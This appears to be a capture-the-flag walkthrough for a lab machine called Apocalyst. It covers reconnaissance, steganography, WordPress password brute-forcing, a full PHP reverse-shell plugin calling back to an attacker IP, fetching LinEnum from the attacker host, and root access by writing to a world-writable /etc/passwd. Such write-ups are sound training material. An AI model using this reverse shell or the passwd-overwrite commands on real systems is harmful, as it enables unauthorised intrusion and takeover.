<h1>Apocalyst 10.10.10.46</h1>

<h2>NMAP</h2>
  nmap -sC -sV -A -T4 10.10.10.46

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
  |   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
  |_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (EdDSA)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-generator: WordPress 4.8
  | http-methods:
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Apocalypse Preparation Blog
  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
  TCP/IP fingerprint:
  OS:SCAN(V=7.60%E=4%D=12/28%OT=22%CT=1%CU=32201%PV=Y%DS=2%DC=T%G=Y%TM=5A4509
  OS:77%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP
  OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
  OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
  OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
  OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
  OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
  OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
  OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
  OS:D=S)

  Uptime guess: 3.443 days (since Mon Dec 25 05:32:59 2017)
  Network Distance: 2 hops
  TCP Sequence Prediction: Difficulty=260 (Good luck!)
  IP ID Sequence Generation: All zeros
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  TRACEROUTE (using port 3389/tcp)
  HOP RTT      ADDRESS
  1   50.71 ms 10.10.14.1
  2   51.92 ms 10.10.10.46

<h2>Dirb</h2>
  dirb http://10.10.10.46/ | tee dirbapocalypse.txt

  URL_BASE: http://10.10.10.46/
  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

  -----------------

  GENERATED WORDS: 4612

  ---- Scanning URL: http://10.10.10.46/ ----
  ==> DIRECTORY: http://10.10.10.46/accounts/
  ==> DIRECTORY: http://10.10.10.46/and/
  ==> DIRECTORY: http://10.10.10.46/announcement/
  ==> DIRECTORY: http://10.10.10.46/any/
  ==> DIRECTORY: http://10.10.10.46/art/
  ==> DIRECTORY: http://10.10.10.46/blog/
  ==> DIRECTORY: http://10.10.10.46/Blog/
  ==> DIRECTORY: http://10.10.10.46/book/
  ==> DIRECTORY: http://10.10.10.46/broken/
  ==> DIRECTORY: http://10.10.10.46/build/
  ==> DIRECTORY: http://10.10.10.46/can/
  ==> DIRECTORY: http://10.10.10.46/custom/
  ==> DIRECTORY: http://10.10.10.46/disclosure/
  ==> DIRECTORY: http://10.10.10.46/down/
  ==> DIRECTORY: http://10.10.10.46/dragon/
  ==> DIRECTORY: http://10.10.10.46/end/
  ==> DIRECTORY: http://10.10.10.46/entry/
  ==> DIRECTORY: http://10.10.10.46/events/
  ==> DIRECTORY: http://10.10.10.46/evil/
  ==> DIRECTORY: http://10.10.10.46/for/
  ==> DIRECTORY: http://10.10.10.46/from/
  ==> DIRECTORY: http://10.10.10.46/get/
  ==> DIRECTORY: http://10.10.10.46/header/
  ==> DIRECTORY: http://10.10.10.46/hidden/
  ==> DIRECTORY: http://10.10.10.46/icon/
  ==> DIRECTORY: http://10.10.10.46/idea/
  + http://10.10.10.46/index.php (CODE:301|SIZE:0)
  ==> DIRECTORY: http://10.10.10.46/info/
  ==> DIRECTORY: http://10.10.10.46/information/
  ==> DIRECTORY: http://10.10.10.46/instance/
  ==> DIRECTORY: http://10.10.10.46/language/
  ==> DIRECTORY: http://10.10.10.46/Log/
  ==> DIRECTORY: http://10.10.10.46/main/
  ==> DIRECTORY: http://10.10.10.46/masthead/
  ==> DIRECTORY: http://10.10.10.46/meta/
  ==> DIRECTORY: http://10.10.10.46/name/
  ==> DIRECTORY: http://10.10.10.46/number/
  ==> DIRECTORY: http://10.10.10.46/org/
  ==> DIRECTORY: http://10.10.10.46/page/
  ==> DIRECTORY: http://10.10.10.46/personal/
  ==> DIRECTORY: http://10.10.10.46/pictures/
  ==> DIRECTORY: http://10.10.10.46/post/
  ==> DIRECTORY: http://10.10.10.46/power/
  ==> DIRECTORY: http://10.10.10.46/reference/
  ==> DIRECTORY: http://10.10.10.46/RSS/
  ==> DIRECTORY: http://10.10.10.46/Search/
  ==> DIRECTORY: http://10.10.10.46/secondary/
  + http://10.10.10.46/server-status (CODE:403|SIZE:299)
  ==> DIRECTORY: http://10.10.10.46/site/
  ==> DIRECTORY: http://10.10.10.46/start/
  ==> DIRECTORY: http://10.10.10.46/state/
  ==> DIRECTORY: http://10.10.10.46/term/
  ==> DIRECTORY: http://10.10.10.46/text/
  ==> DIRECTORY: http://10.10.10.46/thanks/
  ==> DIRECTORY: http://10.10.10.46/the/
  ==> DIRECTORY: http://10.10.10.46/this/
  ==> DIRECTORY: http://10.10.10.46/time/
  ==> DIRECTORY: http://10.10.10.46/wp-admin/
  ==> DIRECTORY: http://10.10.10.46/wp-content/
  ==> DIRECTORY: http://10.10.10.46/wp-includes/
  + http://10.10.10.46/xmlrpc.php (CODE:405|SIZE:42)

  ---- Entering directory: http://10.10.10.46/accounts/ ----
  + http://10.10.10.46/accounts/index.html (CODE:200|SIZE:157)

  ---- Entering directory: http://10.10.10.46/and/ ----
  + http://10.10.10.46/and/index.html (CODE:200|SIZE:157)

  ---- Entering directory: http://10.10.10.46/announcement/ ----
  + http://10.10.10.46/announcement/index.html (CODE:200|SIZE:157)

  ---- Entering directory: http://10.10.10.46/any/ ----
  + http://10.10.10.46/any/index.html (CODE:200|SIZE:157)

  ---- Entering directory: http://10.10.10.46/art/ ----
  + http://10.10.10.46/art/index.html (CODE:200|SIZE:157)

  ---- Entering directory: http://10.10.10.46/blog/ ----
  + http://10.10.10.46/blog/index.html (CODE:200|SIZE:157)

<h2>Cewl Custom Wordlist</h2>
  cewl http://10.10.10.46 -w wordlist
  the
  Revelation
  Apocalypse
  entry
  Daniel
  content
  revelation
  Preparation
  Blog
  site
  time
  header
  July
  End
  signs
  events
  through
  Assumptio
  Mosis
  world
  Signs
  Times
  God
  number
  Comments
  WordPress
  branding
  Posts
  article
  apocalypse
  website
  apocalyptic
  state
  Christ
  comes
  need
  setting
  could
  more
  date
  What
  know
  make
  info
  those
  Greek
  literally
  disclosure
  vision
  heavenly
  John
  Testament
  primary
  term
  may
  described
  after
  being
  Symbolism
  trumpets
  frequent
  also
  Thus
  length
  times
  Enoch
  weeks
  days
  seven
  Esdras
  disambiguation
  following
  judgment
  wicked
  Under
  Development
  Search
  Recent
  RSS
  Feed
  Really
  Simple
  Syndication
  Skip
  text
  Scroll
  down
  custom
  masthead
  express
  found
  believe
  countless
  predictions
  prepare
  militant
  Christians
  linking
  dots
  discover
  our
  planet
  Increased
  seismic
  activity
  around
  globe
  coupled
  animal
  deaths
  whale
  beachings
  Zealand
  amazing
  evidence
  nigh
  Conspiracy
  says
  Bible
  states
  Never
  evident
  diverse
  places
  frequency
  intensity
  Our
  first
  fulfil
  Without
  doubt
  living
  references
  Biblical
  Hosea
  claims
  loss
  life
  sign
  points
  reader
  books
  Matthew
  Luke
  natural
  disasters
  impending
  doom
  adding
  have
  earthquakes
  already
  according
  Earthquake
  Track
  continues
  giving
  plenty
  warning
  without
  excuse
  day
  return
  upon
  like
  thief
  night
  catches
  unaware
  heed
  get
  ready
  However
  Carl
  Olson
  editor
  Catholic
  World
  Report
  slammed
  story
  told
  Daily
  Star
  Date
  option
  centuries
  millennia
  again
  very
  soon
  Anticipation
  readiness
  turn
  into
  despair
  fear
  error
  means
  nothing
  Welcome
  new
  blog
  guys
  few
  people
  might
  coming
  what
  preparing
  Well
  let
  simple
  Its
  freakin
  baby
  But
  wiki
  wanting
  Ancient
  ἀποκάλυψις
  apokálypsis
  ἀπό
  καλύπτω
  uncovering
  knowledge
  religious
  contexts
  usually
  something
  hidden
  secrets
  can
  sense
  earthly
  realities
  Ἀποκάλυψις
  Ἰωάννου
  Apokalypsis
  Ioannou
  last
  book
  receives
  ultimate
  victory
  good
  over
  evil
  present
  one
  dates
  Today
  commonly
  reference
  any
  prophetic
  called
  scenario
  general
  Dreams
  Viktor
  Vasnetsov
  Four
  Horsemen
  made
  dream
  accounts
  revelations
  manner
  its
  reception
  generally
  According
  long
  period
  fasting
  standing
  river
  appears
  him
  follows
  Seven
  characteristic
  writing
  One
  instance
  occurs
  where
  gematria
  employed
  either
  obscuring
  writer
  enhancing
  ancient
  cultures
  letters
  numbers
  Romans
  their
  use
  Roman
  numerals
  symbolic
  name
  Taxo
  Number
  Beast
  Iησōῦς
  Sibyllines
  Similar
  prophecy
  predicted
  must
  fulfilled
  half
  years
  Dispensationalists
  fifty
  eight
  announcement
  certain
  starting
  point
  going
  forth
  commandment
  restore
  build
  Jerusalem
  unto
  Messiah
  Prince
  shall
  mention
  covenant
  sacrifice
  broken
  xciii
  Baruch
  needed
  xxvi
  viii
  mentions
  two
  witnesses
  supernatural
  power
  compare
  vii
  Symbolic
  language
  describe
  persons
  things
  thus
  horns
  heads
  wings
  seals
  vials
  wrath
  bowl
  judgments
  dragon
  eagle
  Russian
  Orthodox
  icon
  Apocalyptic
  contemporary
  Mexican
  painter
  Mauricio
  García
  Vega
  Hebrew
  Old
  pictures
  images
  glorification
  who
  given
  Rightiousness
  Job
  Psalms
  dead
  Sheol
  awaiting
  consigned
  eternal
  suffering
  fires
  Gehinnom
  lake
  fire
  mentioned
  Site
  load
  correctly
  design
  still
  development
  Estimated
  completion
  May
  main
  Archives
  Categories
  Uncategorised
  Meta
  Log
  Entries
  org
  secondary
  Proudly
  powered
  colophon
  contain
  page
  RSD
  Link
  needs
  March
  Powered
  art
  semantic
  personal
  publishing
  platform

<h2>Dirbuster</h2>
  Interestingly http://10.10.10.46:80/Rightiousness/ is 440 bytes while the
  rest is only 420.

<h2>Steghide on image</h2>
  steghide extract -sf /home/e/Desktop/image.jpg
  Enter passphrase:
  wrote extracted data to "list.txt".

  Note: No passphrase, so dont try fancy bruteforce or similar!

<h2>WPscan</h2>
  wpscan -u http://10.10.10.46 --enumerate u

  Enumerating usernames ...
  [+] Identified the following 1 user/s:
    +----+----------+-----------------------------------+
    | Id | Login    | Name                              |
    +----+----------+-----------------------------------+
    | 1  | falaraki | falaraki – Apocalypse Preparation |
    +----+----------+-----------------------------------+

  wpscan -u http://10.10.10.46 --wordlist /list.txt --username falaraki
    We received an unknown response for login: falaraki and password: Transclisiation

<h2>Web Shell Upload</h2>
  Login to wp site with falaraki & Transclisiation
  Let’s use that to login through http://10.10.10.46/wp-login.php.
  If login doesnt work set 10.10.10.46 to apocalyst.htb in /etc/hosts file.
  Then, we can upload a malicious plugin to gain a reverse shell.
  To do this, we can use pentestmonkey popular php-reverse-shell.php.
  We must first edit the php-reverse-shell to include your attacker’s machine IP address

<h2>Listener</h2>
  nc -lvp 4441

<h2>Shell code</h2>
  <?php

  /*
  *     Plugin Name: My Shell
  *     Plugin URI: https://github.com/doesntexist
  *     Description: Good shell
  *     Author: Hacker
  *     Version: 0.2
  *     Author URI: https://doesntexist.com
  *
  */

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '10.10.14.105';  // CHANGE THIS
  $port = 4441;       // CHANGE THIS
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;
  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
  // Fork and have the parent process exit
  $pid = pcntl_fork();

  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }

  if ($pid) {
    exit(0);  // Parent exits
  }

  // Make the current process a session leader
  // Will only succeed if we forked
  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }

  $daemon = 1;
  } else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
  // Check for end of TCP connection
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }

  // Check for end of STDOUT
  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }

  // Wait until a command is end down $sock, or some
  // command output is available on STDOUT or STDERR
  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

  // If we can read from the TCP socket, send
  // data to process's STDIN
  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }

  // If we can read from the process's STDOUT
  // send data down tcp connection
  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }

  // If we can read from the process's STDERR
  // send data down tcp connection
  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
  if (!$daemon) {
    print "$string\n";
  }
  }

  ?>

<h2>User</h2>
  cd /home/falaraki
  cat user.txt


<h2>Priv esc</h2>
  home/falaraki $ ls -la
  -rw-rw-r-- 1 falaraki falaraki  109 Jul 26 17:29 .secret
  cat .secret
    S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M=
  cat .secret | base64 -d
  Keep forgetting password so this will keep it safe!
  Y0uAINtG37TiNgTH!sUzersP4ss$

  $ ssh falaraki@10.10.10.46
    The authenticity of host '10.10.10.46 (10.10.10.46)' can't be established.
    ECDSA key fingerprint is SHA256:haGh7sn13yyJk8VPU6MVYAqxX3Bm2XP9YhF0pDnjcJA.
    Are you sure you want to continue connecting (yes/no)? yes
    Warning: Permanently added '10..10.10.46' (ECDSA) to the list of known hosts.
    falaraki@10.10.10.46's password:

  cd /tmp
  on attack machine: python -m SimpleHTTPServer 8081
  wget http://10.10.14.105:8081/LinEnum.sh (after first setting up HTTPserver on attacker)
  chmod +x LinEnum.sh
  chmod 777 LinEnum.sh
  ./LinEnum.sh
  ...
  Can we read/write sensitive files:
  -rw-rw-rw- 1 root root 1637 Jul 26 12:46 /etc/passwd
  -rw-r--r-- 1 root root 830 Jul 27 12:06 /etc/group
  -rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
  -rw-r----- 1 root shadow 1070 Jul 26 13:41 /etc/shadow
  ...
  The exploit here is that passwd is writeable by any user (writeable passwd).
  All we have to do is add a root user. As users are identified with their ID,
  we can just set the fake root user with ID of 0 and switch to it to gain all root privileges.
  More information can be found here: https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file

  perl -le 'print crypt("foo", "aa")'
  aaKNIEDOaueR6
  echo rootfake2:aaKNIEDOaueR6:0:0:rootfake2:/root:/bin/bash >> /etc/passwd
  su rootfake2
  Password:
  root@apocalyst:/home/falaraki# cd /root
  root@apocalyst:~# ls
  root.txt
  root@apocalyst:~# cat root.txt

  Pass: aaKNIEDOaueR6

<h2>Walktrough</h2>wget http://10.10.14.105:8081/LinEnum.sh


  When visiting links found in dirb it seems all leads to same image?
  But do they?
  "We have a hit, Rightiousness returns with 440 bytes whereas all the other one
   has 421 bytes. Viewing the source code we also find <!-- needle -->
   yet the image remains the same. There is probably some stego going on."

  Use steghide to extract list.txt from largest (likely) picture in /upload

  Just type:
    echo root::0:0:root:/root:/bin/bash > /etc/passwd
    su
  and you are root.

(Removing x means root requires no password anymore, you can use "sed" command
instead of "echo" yet this is enough to get root shell)
